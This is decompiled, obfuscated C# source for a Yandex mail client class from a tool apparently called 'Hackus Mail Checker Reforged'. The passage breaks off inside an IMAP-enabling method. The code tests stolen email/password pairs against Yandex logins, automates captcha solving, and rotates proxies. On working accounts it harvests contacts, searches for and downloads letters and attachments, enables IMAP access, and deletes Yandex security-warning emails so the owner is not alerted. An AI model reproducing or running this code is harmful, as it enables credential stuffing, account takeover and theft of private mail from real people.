using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Web.Yandex;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000B3 RID: 179
	internal class YandexClientNew
	{
		// Token: 0x1700013A RID: 314
		// (get) Token: 0x060005B8 RID: 1464 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x060005B9 RID: 1465 RVA: 0x00009D14 File Offset: 0x00007F14
		public YandexClientNew(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x060005BA RID: 1466 RVA: 0x00024F88 File Offset: 0x00023188
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x060005BB RID: 1467 RVA: 0x00024FFC File Offset: 0x000231FC
		private OperationResult Login()
		{
			OperationResult csrfToken;
			OperationResult trackId;
			OperationResult item4;
			OperationResult operationResult2;
			for (;;)
			{
				this.Reset();
				csrfToken = this.GetCsrfToken();
				if (csrfToken == OperationResult.Error)
				{
					break;
				}
				if (csrfToken != OperationResult.HttpError)
				{
					trackId = this.GetTrackId();
					switch (trackId)
					{
					case OperationResult.Bad:
						goto IL_1B1;
					case OperationResult.Error:
						goto IL_1D3;
					case OperationResult.HttpError:
						break;
					default:
					{
						OperationResult operationResult = this.CreateSession();
						if (operationResult == OperationResult.Captcha)
						{
							if (!WebSettings.Instance.SolveCaptcha || string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
							{
								return OperationResult.Captcha;
							}
							ValueTuple<OperationResult, string, string> captchaLink = this.GetCaptchaLink();
							OperationResult item = captchaLink.Item1;
							string item2 = captchaLink.Item2;
							string item3 = captchaLink.Item3;
							if (item == OperationResult.Error)
							{
								goto IL_18B;
							}
							if (item == OperationResult.HttpError)
							{
								break;
							}
							ValueTuple<OperationResult, MemoryStream> captchaImage = this.GetCaptchaImage(item2);
							item4 = captchaImage.Item1;
							MemoryStream item5 = captchaImage.Item2;
							if (item4 == OperationResult.Error)
							{
								goto Block_8;
							}
							if (item4 == OperationResult.HttpError)
							{
								break;
							}
							ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveCaptcha(Convert.ToBase64String(item5.ToArray()), <Module>.smethod_2<string>(2116311133), false);
							OperationResult item6 = valueTuple.Item1;
							string item7 = valueTuple.Item2;
							if (item6 == OperationResult.Error)
							{
								return OperationResult.Captcha;
							}
							if (item6 == OperationResult.HttpError)
							{
								break;
							}
							operationResult2 = this.SubmitCaptchaAnswer(item3, item7);
							if (operationResult2 == OperationResult.Error)
							{
								goto IL_16A;
							}
							if (operationResult2 == OperationResult.HttpError)
							{
								break;
							}
							operationResult = this.CreateSession();
						}
						if (operationResult != OperationResult.HttpError)
						{
							return operationResult;
						}
						break;
					}
					}
				}
			}
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, <Module>.smethod_5<string>(-316158613));
			return csrfToken;
			Block_8:
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, <Module>.smethod_2<string>(-979085578));
			return item4;
			IL_16A:
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, <Module>.smethod_3<string>(-1795816397));
			return operationResult2;
			IL_18B:
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, <Module>.smethod_6<string>(395587359));
			return OperationResult.Error;
			IL_1B1:
			StatisticsManager.Instance.AddBadDetails(this._mailbox.Address, <Module>.smethod_2<string>(147008518));
			return trackId;
			IL_1D3:
			StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, <Module>.smethod_4<string>(-678781527));
			return trackId;
		}

		// Token: 0x060005BC RID: 1468 RVA: 0x00025200 File Offset: 0x00023400
		private OperationResult GetCsrfToken()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					Match match = Regex.Match(httpRequest.Post(<Module>.smethod_4<string>(-1032236842)).ToString(), <Module>.smethod_5<string>(1282532498));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._csrfToken = match.Groups[1].Value;
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005BD RID: 1469 RVA: 0x000252A8 File Offset: 0x000234A8
		private OperationResult GetTrackId()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						string value = this._mailbox.Address.Split(new char[]
						{
							'@'
						})[0];
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(413574250), this._csrfToken),
							new KeyValuePair<string, string>(<Module>.smethod_6<string>(-1978702295), value)
						}, false, null);
						string text = httpRequest.Post(<Module>.smethod_6<string>(1723557480), formUrlEncodedContent).ToString();
						if (text.Contains(<Module>.smethod_2<string>(-369803101)))
						{
							return OperationResult.Bad;
						}
						Match match = Regex.Match(text, <Module>.smethod_3<string>(-1915119207));
						if (!match.Success)
						{
							return OperationResult.Error;
						}
						this._trackId = match.Groups[1].Value;
						return OperationResult.Ok;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005BE RID: 1470 RVA: 0x000253E0 File Offset: 0x000235E0
		private OperationResult CreateSession()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(413574250), this._csrfToken),
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(-46006352), this._mailbox.Password),
							new KeyValuePair<string, string>(<Module>.smethod_4<string>(-499649710), this._trackId)
						}, false, null);
						string text = httpRequest.Post(<Module>.smethod_2<string>(-119557214), formUrlEncodedContent).ToString();
						if (text.Contains(<Module>.smethod_6<string>(-1008901644)))
						{
							return OperationResult.Captcha;
						}
						if (text.ContainsOne(new string[]
						{
							<Module>.smethod_2<string>(446213940),
							<Module>.smethod_6<string>(2046722908)
						}))
						{
							return OperationResult.Blocked;
						}
						if (text.Contains(<Module>.smethod_3<string>(1969964942)))
						{
							return OperationResult.Bad;
						}
						if (!text.ContainsOne(new string[]
						{
							<Module>.smethod_2<string>(-617324882),
							<Module>.smethod_2<string>(-1582944634)
						}))
						{
							return OperationResult.Error;
						}
						return OperationResult.Ok;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005BF RID: 1471 RVA: 0x00025580 File Offset: 0x00023780
		[return: TupleElementNames(new string[]
		{
			"status",
			"url",
			"key"
		})]
		private ValueTuple<OperationResult, string, string> GetCaptchaLink()
		{
			for (int i = 0; i < 3; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AddHeader(<Module>.smethod_4<string>(-1488415140), <Module>.smethod_6<string>(-1495379571));
						httpRequest.AllowAutoRedirect = false;
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>(<Module>.smethod_4<string>(1422717087), this._csrfToken),
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(-1368062543), this._trackId)
						}, false, null);
						string input = httpRequest.Post(<Module>.smethod_6<string>(270330130), formUrlEncodedContent).ToString();
						Match match = Regex.Match(input, <Module>.smethod_3<string>(1488898824));
						if (!match.Success)
						{
							return new ValueTuple<OperationResult, string, string>(OperationResult.Error, null, null);
						}
						string value = match.Groups[1].Value;
						match = Regex.Match(input, <Module>.smethod_5<string>(-2004262029));
						if (!match.Success)
						{
							return new ValueTuple<OperationResult, string, string>(OperationResult.Error, null, null);
						}
						string value2 = match.Groups[1].Value;
						return new ValueTuple<OperationResult, string, string>(OperationResult.Ok, value, value2);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, string, string>(OperationResult.HttpError, null, null);
		}

		// Token: 0x060005C0 RID: 1472 RVA: 0x0002571C File Offset: 0x0002391C
		[return: TupleElementNames(new string[]
		{
			"status",
			"image"
		})]
		private ValueTuple<OperationResult, MemoryStream> GetCaptchaImage(string url)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						MemoryStream memoryStream = httpRequest.Get(url, null).ToMemoryStream();
						if (memoryStream != null && memoryStream.Length != 0L)
						{
							return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Ok, memoryStream);
						}
						return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Error, null);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, MemoryStream>(OperationResult.HttpError, null);
		}

		// Token: 0x060005C1 RID: 1473 RVA: 0x000257B8 File Offset: 0x000239B8
		private OperationResult SubmitCaptchaAnswer(string key, string answer)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddHeader(<Module>.smethod_3<string>(-121656043), <Module>.smethod_3<string>(1323469750));
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>(<Module>.smethod_4<string>(1422717087), this._csrfToken),
							new KeyValuePair<string, string>(<Module>.smethod_4<string>(-499649710), this._trackId),
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(-1599264479), answer),
							new KeyValuePair<string, string>(<Module>.smethod_3<string>(-477703170), key)
						}, false, null);
						if (httpRequest.Post(<Module>.smethod_2<string>(481577736), formUrlEncodedContent).ToString().Contains(<Module>.smethod_2<string>(-168516749)))
						{
							return OperationResult.Ok;
						}
						return OperationResult.Error;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005C2 RID: 1474 RVA: 0x000258E8 File Offset: 0x00023AE8
		private OperationResult DownloadContacts()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader(<Module>.smethod_3<string>(-121656043), <Module>.smethod_3<string>(1323469750));
					StringBuilder stringBuilder = new StringBuilder(<Module>.smethod_6<string>(-1956215090));
					stringBuilder.Append(this._ckey);
					stringBuilder.Append(<Module>.smethod_4<string>(-1163285469));
					foreach (object obj in Regex.Matches(httpRequest.Post(<Module>.smethod_3<string>(-316062838), stringBuilder.ToString(), <Module>.smethod_5<string>(-1722116199)).ToString(), <Module>.smethod_3<string>(1429214351)))
					{
						FileManager.SaveContact(((Match)obj).Groups[1].Value);
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Retry;
		}

		// Token: 0x060005C3 RID: 1475 RVA: 0x00025A18 File Offset: 0x00023C18
		private void ProcessValid()
		{
			if (!this.SearchSettings.Search && !SearchSettings.Instance.ParseContacts && (!this.SearchSettings.SearchAttachments || this.SearchSettings.SearchAttachmentsMode != SearchAttachmentsMode.Everywhere) && !WebSettings.Instance.EnableYandexImapAccess)
			{
				return;
			}
			this.GetCKey();
			if (this._ckey == null)
			{
				return;
			}
			OperationResult operationResult = OperationResult.Retry;
			int num = 0;
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			bool flag4 = false;
			bool flag5 = false;
			bool flag6 = false;
			bool flag7 = false;
			bool flag8 = false;
			List<Request> list = new List<Request>();
			Queue<Uid> queue = null;
			List<Uid> list2 = new List<Uid>();
			while (operationResult == OperationResult.Retry)
			{
				if (num <= 2)
				{
					if (!flag && SearchSettings.Instance.ParseContacts)
					{
						operationResult = this.DownloadContacts();
						if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
						{
							flag = true;
						}
					}
					else
					{
						operationResult = OperationResult.Ok;
					}
					if (operationResult == OperationResult.Retry)
					{
						if (ProxySettings.Instance.UseProxy)
						{
							this._proxyClient = ProxyManager.Instance.GetProxy();
							continue;
						}
						continue;
					}
					else
					{
						if (!flag2 && this.SearchSettings.Search)
						{
							operationResult = this.SearchMessages(list);
							if (operationResult == OperationResult.Ok)
							{
								flag2 = true;
							}
						}
						else
						{
							operationResult = OperationResult.Ok;
						}
						if (operationResult == OperationResult.Retry)
						{
							if (ProxySettings.Instance.UseProxy)
							{
								this._proxyClient = ProxyManager.Instance.GetProxy();
								continue;
							}
							continue;
						}
						else if (operationResult != OperationResult.Bad)
						{
							if (!flag8 && WebSettings.Instance.EnableYandexImapAccess)
							{
								operationResult = this.EnableImapAccess();
								if (operationResult == OperationResult.Ok || operationResult == OperationResult.Error)
								{
									flag8 = true;
								}
							}
							else
							{
								operationResult = OperationResult.Ok;
							}
							if (operationResult != OperationResult.Retry)
							{
								if (!flag3 && this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.Everywhere)
								{
									operationResult = this.SearchAttachments(ref queue);
									if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
									{
										flag3 = true;
									}
								}
								else
								{
									operationResult = OperationResult.Ok;
								}
								if (operationResult == OperationResult.Retry)
								{
									if (ProxySettings.Instance.UseProxy)
									{
										this._proxyClient = ProxyManager.Instance.GetProxy();
										continue;
									}
									continue;
								}
								else
								{
									if (!flag4 && WebSettings.Instance.DeleteYandexWarningMessages)
									{
										operationResult = this.SearchSecurityMessages(list2);
										flag4 = true;
									}
									else
									{
										operationResult = OperationResult.Ok;
									}
									if (!flag5 && this.SearchSettings.DeleteWhenDownloaded)
									{
										foreach (Request request in list)
										{
											list2.AddRange(request.SavedUids);
										}
										flag5 = true;
									}
									else
									{
										operationResult = OperationResult.Ok;
									}
									list2 = new List<Uid>(list2.Distinct<Uid>());
									if (!flag7 && list2.Any<Uid>())
									{
										if (!flag6)
										{
											operationResult = this.MoveMessages(list2);
											if (operationResult == OperationResult.Ok)
											{
												flag6 = true;
											}
										}
										if (operationResult == OperationResult.Ok)
										{
											operationResult = this.DeleteMessages(list2);
											if (operationResult == OperationResult.Ok)
											{
												flag7 = true;
											}
										}
										if (operationResult == OperationResult.Bad)
										{
											flag6 = true;
											flag7 = true;
											break;
										}
									}
									else
									{
										operationResult = OperationResult.Ok;
									}
									if (operationResult != OperationResult.Retry)
									{
										continue;
									}
									if (ProxySettings.Instance.UseProxy)
									{
										this._proxyClient = ProxyManager.Instance.GetProxy();
										continue;
									}
									continue;
								}
							}
							else
							{
								if (ProxySettings.Instance.UseProxy)
								{
									this._proxyClient = ProxyManager.Instance.GetProxy();
									continue;
								}
								continue;
							}
						}
					}
				}
				IL_2BF:
				foreach (Request request2 in list)
				{
					int count = request2.Count;
					if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
					{
						MailboxResult result = new MailboxResult(this._mailbox, request2.ToString(), count);
						MailManager.Instance.AddResult(result);
						StatisticsManager.Instance.IncrementFound();
						FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request2.ToString(), count);
					}
				}
				return;
			}
			goto IL_2BF;
		}

		// Token: 0x060005C4 RID: 1476 RVA: 0x00025DB0 File Offset: 0x00023FB0
		private OperationResult GetCKey()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						string input = httpRequest.Get(<Module>.smethod_3<string>(-2001721690), null).ToString();
						string text;
						if (httpRequest == null)
						{
							text = null;
						}
						else
						{
							HttpResponse response = httpRequest.Response;
							if (response == null)
							{
								text = null;
							}
							else
							{
								Uri address = response.Address;
								text = ((address != null) ? address.AbsolutePath : null);
							}
						}
						string text2 = text;
						if (text2 != null && text2.Contains(<Module>.smethod_4<string>(308323356)))
						{
							return OperationResult.Captcha;
						}
						Match match = Regex.Match(input, <Module>.smethod_5<string>(-1582236175));
						if (match.Success)
						{
							this._ckey = match.Groups[1].Value;
						}
						return OperationResult.Error;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005C5 RID: 1477 RVA: 0x00025EAC File Offset: 0x000240AC
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => YandexClientNew.<>c__DisplayClass20_0.smethod_0(r.Sender, request.Sender) && YandexClientNew.<>c__DisplayClass20_0.smethod_0(r.Body, request.Body) && YandexClientNew.<>c__DisplayClass20_0.smethod_0(r.Subject, request.Subject));
					if (request3 != null)
					{
						if (request3.IsChecked)
						{
							continue;
						}
						if (request3.SavedUids != null)
						{
							if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
							{
								continue;
							}
						}
					}
					else
					{
						request3 = request.Clone();
						request3.FindedUids = new HashSet<Uid>();
						request3.SavedUids = new HashSet<Uid>();
						checkedRequests.Add(request3);
					}
					Request request2 = request3;
					if (!request2.FindedUids.Any<Uid>())
					{
						OperationResult operationResult = this.Search(request2);
						if (operationResult == OperationResult.Error)
						{
							request2.IsChecked = true;
							continue;
						}
						if (operationResult == OperationResult.HttpError)
						{
							return OperationResult.Retry;
						}
					}
					if (this.SearchSettings.DownloadLetters)
					{
						if (CheckerSettings.Instance.UsePop3Limit && request2.FindedUids.Count > CheckerSettings.Instance.Pop3Limit)
						{
							request3.FindedUids = new HashSet<Uid>(request3.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
						}
						using (HashSet<Uid>.Enumerator enumerator2 = request3.FindedUids.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								Uid uid = enumerator2.Current;
								if (!request3.SavedUids.Any((Uid u) => u == uid))
								{
									if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
									{
										break;
									}
									MailMessage message;
									OperationResult operationResult2 = this.FetchMessage(uid, this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded, out message);
									if (operationResult2 != OperationResult.Error)
									{
										if (operationResult2 == OperationResult.HttpError)
										{
											return OperationResult.Retry;
										}
										request3.SavedUids.Add(uid);
										FileManager.SaveWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
									}
									else
									{
										request3.SavedUids.Add(uid);
									}
								}
							}
						}
					}
					request2.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x060005C6 RID: 1478 RVA: 0x00026138 File Offset: 0x00024338
		private OperationResult SearchAttachments(ref Queue<Uid> leftAttachmentMessages)
		{
			this.WaitPause();
			if (leftAttachmentMessages == null)
			{
				OperationResult result;
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddHeader(<Module>.smethod_4<string>(-1488415140), <Module>.smethod_3<string>(1323469750));
						StringBuilder stringBuilder = new StringBuilder(<Module>.smethod_5<string>(1952925657));
						stringBuilder.Append(this._ckey);
						stringBuilder.Append(<Module>.smethod_6<string>(-477040965));
						string input = httpRequest.Post(<Module>.smethod_6<string>(268600345), stringBuilder.ToString(), <Module>.smethod_3<string>(-1143472752)).ToString();
						leftAttachmentMessages = new Queue<Uid>();
						if (!Regex.Match(input, <Module>.smethod_3<string>(1331113370)).Success)
						{
							return OperationResult.Ok;
						}
						foreach (object obj in Regex.Matches(input, <Module>.smethod_3<string>(-1518728133)))
						{
							Match match = (Match)obj;
							leftAttachmentMessages.Enqueue(new Uid(match.Groups[1].Value));
						}
					}
					goto IL_149;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
					result = OperationResult.Retry;
				}
				return result;
			}
			IL_149:
			while (leftAttachmentMessages.Any<Uid>())
			{
				Uid uid = leftAttachmentMessages.Dequeue();
				MailMessage mailMessage;
				if (this.FetchMessage(uid, true, out mailMessage) == OperationResult.HttpError)
				{
					return OperationResult.Retry;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x060005C7 RID: 1479 RVA: 0x00026300 File Offset: 0x00024500
		private OperationResult SearchSecurityMessages(List<Uid> toDelete)
		{
			Request request = new Request
			{
				Sender = <Module>.smethod_4<string>(-1085740358)
			};
			request.FindedUids = new HashSet<Uid>();
			if (this.Search(request) == OperationResult.Ok)
			{
				toDelete.AddRange(request.FindedUids.Take(1));
			}
			return OperationResult.Ok;
		}

		// Token: 0x060005C8 RID: 1480 RVA: 0x0002634C File Offset: 0x0002454C
		private OperationResult MoveMessages(List<Uid> uids)
		{
			this.WaitPause();
			OperationResult result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader(<Module>.smethod_6<string>(578231860), <Module>.smethod_2<string>(-415939366));
					StringBuilder stringBuilder = new StringBuilder(<Module>.smethod_6<string>(1071628927));
					for (int i = 0; i < uids.Count; i++)
					{
						stringBuilder.Append(<Module>.smethod_6<string>(-77460630));
						stringBuilder.Append(uids[i].UID);
						if (i == uids.Count - 1)
						{
							stringBuilder.Append(<Module>.smethod_4<string>(2069567598));
						}
						else
						{
							stringBuilder.Append(<Module>.smethod_4<string>(-200222181));
						}
					}
					stringBuilder.Append(<Module>.smethod_5<string>(-1679198443));
					string text = string.Concat(new string[]
					{
						<Module>.smethod_4<string>(1107728324),
						stringBuilder.ToString(),
						<Module>.smethod_3<string>(2014229903),
						this._ckey,
						<Module>.smethod_3<string>(1931482298)
					});
					if (httpRequest.Post(<Module>.smethod_6<string>(268600345), text, <Module>.smethod_6<string>(-989874009)).ToString().Contains(<Module>.smethod_2<string>(-516681706)))
					{
						result = OperationResult.Ok;
					}
					else
					{
						result = OperationResult.Bad;
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.Retry;
			}
			return result;
		}

		// Token: 0x060005C9 RID: 1481 RVA: 0x000264EC File Offset: 0x000246EC
		private OperationResult DeleteMessages(List<Uid> uids)
		{
			this.WaitPause();
			OperationResult result;
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader(<Module>.smethod_5<string>(-818853918), <Module>.smethod_2<string>(-415939366));
					StringBuilder stringBuilder = new StringBuilder(<Module>.smethod_2<string>(-1816771512));
					for (int i = 0; i < uids.Count; i++)
					{
						stringBuilder.Append(<Module>.smethod_6<string>(-77460630));
						stringBuilder.Append(uids[i].UID);
						if (i != uids.Count - 1)
						{
							stringBuilder.Append(<Module>.smethod_5<string>(-1869149809));
						}
						else
						{
							stringBuilder.Append(<Module>.smethod_2<string>(1588727045));
						}
					}
					stringBuilder.Append(<Module>.smethod_6<string>(-261530549));
					string text = string.Concat(new string[]
					{
						<Module>.smethod_6<string>(-1665915577),
						stringBuilder.ToString(),
						<Module>.smethod_2<string>(-1498621303),
						this._ckey,
						<Module>.smethod_3<string>(1931482298)
					});
					if (httpRequest.Post(<Module>.smethod_3<string>(-316062838), text, <Module>.smethod_5<string>(-1722116199)).ToString().Contains(<Module>.smethod_4<string>(1369213571)))
					{
						result = OperationResult.Ok;
					}
					else
					{
						result = OperationResult.Bad;
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.Retry;
			}
			return result;
		}

		// Token: 0x060005CA RID: 1482 RVA: 0x0002668C File Offset: 0x0002488C
		private OperationResult Search(Request searchRequest)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					httpRequest.AddHeader(<Module>.smethod_3<string>(-121656043), <Module>.smethod_4<string>(1140862287));
					string input = httpRequest.Post(<Module>.smethod_6<string>(268600345), this.BuildSearchQuery(searchRequest), <Module>.smethod_6<string>(-989874009)).ToString();
					Match match = Regex.Match(input, <Module>.smethod_6<string>(1739125545));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					match = Regex.Match(input, <Module>.smethod_3<string>(746031682));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					searchRequest.Count = int.Parse(match.Groups[1].Value);
					foreach (object obj in Regex.Matches(input, <Module>.smethod_3<string>(-1518728133)))
					{
						Match match2 = (Match)obj;
						searchRequest.FindedUids.Add(new Uid(match2.Groups[1].Value));
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005CB RID: 1483 RVA: 0x00026838 File Offset: 0x00024A38
		private OperationResult FetchMessage(Uid uid, bool downloadAttachments, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader(<Module>.smethod_4<string>(-1488415140), <Module>.smethod_2<string>(-415939366));
					string text = string.Concat(new string[]
					{
						<Module>.smethod_2<string>(1760023440),
						uid.UID.ToString(),
						<Module>.smethod_6<string>(1740142621),
						this._ckey,
						<Module>.smethod_2<string>(780783158)
					});
					string text2 = httpRequest.Post(<Module>.smethod_6<string>(268600345), text, <Module>.smethod_3<string>(-1143472752)).ToString();
					Match match = Regex.Match(text2, <Module>.smethod_2<string>(212312689));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					long unixTimeStamp = long.Parse(match.Groups[1].Value);
					message.Date = DateHelpers.UnixTimeStampToDateInMilliseconds(unixTimeStamp);
					match = Regex.Match(text2, <Module>.smethod_3<string>(-1461103371));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.AlternateViews.Add(new Attachment(<Module>.smethod_5<string>(473053949), match.Groups[1].Value));
					match = Regex.Match(text2, <Module>.smethod_2<string>(1496256187));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.From = match.Groups[1].Value;
					message.Subject = <Module>.smethod_2<string>(1743703595);
					if (downloadAttachments)
					{
						try
						{
							if (text2.Contains(<Module>.smethod_3<string>(1429148215)))
							{
								return OperationResult.Ok;
							}
							match = Regex.Match(text2, <Module>.smethod_5<string>(-1264326175));
							if (match.Success)
							{
								AttachmentInfo[] array = JsonConvert.DeserializeObject<AttachmentInfo[]>(match.Groups[1].Value);
								for (int i = 0; i < array.Length; i++)
								{
									AttachmentInfo attachment = array[i];
									attachment.Ids = uid.UID;
									if (!SearchSettings.Instance.UseAttachmentFilters || SearchSettings.Instance.AttachmentFilters.Any((string filter) => attachment.Name.ContainsIgnoreCase(filter)))
									{
										Attachment attachment2 = this.FetchAttachment(attachment);
										if (attachment2 != null)
										{
											FileManager.SaveAttachment(attachment2, this._mailbox.Address);
										}
									}
								}
							}
						}
						catch
						{
						}
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005CC RID: 1484 RVA: 0x00026B34 File Offset: 0x00024D34
		private Attachment FetchAttachment(AttachmentInfo attachmentInfo)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = true;
					httpRequest.AddUrlParam(<Module>.smethod_4<string>(-1760129032), attachmentInfo.Name);
					httpRequest.AddUrlParam(<Module>.smethod_2<string>(-1019872795), attachmentInfo.Hid);
					httpRequest.AddUrlParam(<Module>.smethod_4<string>(2026816997), attachmentInfo.Ids);
					MemoryStream memoryStream = httpRequest.Get(<Module>.smethod_6<string>(1291719964) + attachmentInfo.Name, null).ToMemoryStream();
					if (memoryStream != null && memoryStream.Length != 0L && httpRequest.Response.IsOK)
					{
						return new Attachment
						{
							Name = attachmentInfo.Name,
							Body = memoryStream.ToArray()
						};
					}
					return null;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060005CD RID: 1485 RVA: 0x00026C40 File Offset: 0x00024E40
		private OperationResult EnableImapAccess()
		{
			this.WaitPause();
			OperationResult result;
			try
			{
